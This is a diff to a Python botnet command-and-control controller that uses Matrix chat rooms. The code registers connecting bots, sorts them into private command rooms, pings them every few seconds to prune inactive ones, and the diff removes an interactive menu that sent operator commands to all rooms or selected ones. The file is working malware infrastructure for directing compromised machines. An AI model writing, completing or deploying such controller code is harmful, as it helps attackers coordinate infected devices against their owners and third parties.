@@ -76,7 +76,6 @@ class BotnetController:
     announce_room: Room
     command_rooms: dict[str, CommandRoom]
     
-    
     def __init__(self):
         self.device_id = "BOTCONTROLLER"
         self.pinging = False
@@ -109,7 +108,7 @@ class BotnetController:
         return room
             
     def sync_rooms(self):
-        joined_rooms: dict[str, Room] = self.client.get_rooms()
+        joined_rooms: dict[str, Room] = self.client.rooms
         for id, room in joined_rooms.items():
             if room.name.startswith("cmd_"):
                 self.command_rooms[id] = CommandRoom(room)
@@ -131,6 +130,7 @@ class BotnetController:
     def on_message(self, room, event):
         msgbody: str = event["content"]["body"]
         action, info = msgbody.split(":", 1)
+        
         if action == "CONNECT" and not self.pinging:
             msgbody = msgbody.removeprefix("CONNECT:")
             msgbody = json.loads(msgbody)
@@ -142,10 +142,12 @@ class BotnetController:
                 f"RESOLVE {botid}:{room_id}"
             )
             self.assign_bot(msgbody, room_id)
+            
         elif action == "DISCONNECT" and not self.pinging:
             room_id, bot_id = info.rsplit(":", 1)
             self.command_rooms[room_id].remove_bot(bot_id)
-        elif action == "PONG":
+            
+        elif action == "PONG" and self.pinging:
             room_id, bot_id = info.rsplit(":", 1)
             self.command_rooms[room_id].set_active(bot_id)
             
@@ -154,6 +156,7 @@ class BotnetController:
     def create_room(self, name: str) -> Room:
         room: Room = self.client.create_room(name, is_public=False, invitees=[BOTS_NAME])
         room.set_room_name(name)
+        time.sleep(1)
         return room
     
     def add_command_room(self, name: str):
@@ -162,7 +165,7 @@ class BotnetController:
 
     def ping_loop(self):
         while True:
-            time.sleep(10) # every 10 minutes
+            time.sleep(8) # every 8 sec
             self.pinging = True
             # Mark
             for room in self.command_rooms.values():
@@ -174,76 +177,16 @@ class BotnetController:
                 room.delete_inactive_bots()
             self.pinging = False
 
-
-    # --------------- options ------------------
-    def command_option(self):
-        command = input("Command: ")
-        all_rooms = input("Would you like to send command to all rooms [Y/n]? ").lower()
-        if all_rooms == 'y':
-            self.send_to_all(command)
-            return
-        room_list = list(self.command_rooms.items())
-        print("To which room would you like to send a command?")
-        for idx, (_, room) in enumerate(room_list):
-            print(f"#{idx} | {room.room.name}: {len(room.bots)} bots")
-        room_nr = int(input("Choose room number: "))
-        if room_nr >= len(room_list):
-            print("realy??")
-            return
-        
-        _, room = room_list[room_nr]
-        self.send_command(command, room)
-
-        
-    def show_state_option(self):
-        total_bot_count = 0
-        for room_id, room in self.command_rooms.items():
-            bot_count = len(room.bots)
-            total_bot_count += bot_count
-            print(f"Room: {room.room.name}: {bot_count} bots")
-        print(f"Total Bots: {total_bot_count}")
-        
-
-    def create_room_option(self):
-        room_name = input("Room name: ")
-        room_name = room_name.replace(" ", "_")
-        self.add_command_room(room_name)
-        print("[+] room created successfully")
-    
-    def dump_state(self):
-        # TODO
-        pass
-
     def run(self):
         self.login()
         self.sync_rooms()
         
         self.announce_room.add_listener(self.on_message)
         self.client.start_listener_thread()
-        threading.Thread(name="PING THREAD", target=self.ping_loop, daemon=True).start()
-
         
-        print("[+] Controller ready. Enter commands to send to bots.")
-        while True:
-            print("#1 Send Command")
-            print("#2 Show simple botnet state")
-            print("#3 Create Room")
-            print("#4 Dump state to file")
-            option = int(input("What would you like to do? "))
-            print()
-            match option:
-                case 1:
-                    self.command_option()
-                case 2:
-                    self.show_state_option()
-                case 3:
-                    self.create_room_option()
-                case 4:
-                    self.dump_state()
-                case _:
-                    print("Invalid Option, choose again")
-
-            print("-----------------------------------------")
+        threading.Thread(name="PING THREAD", target=self.ping_loop, daemon=True).start()
+        
+        
 if __name__ == "__main__":
     controller = BotnetController()
     controller.run()
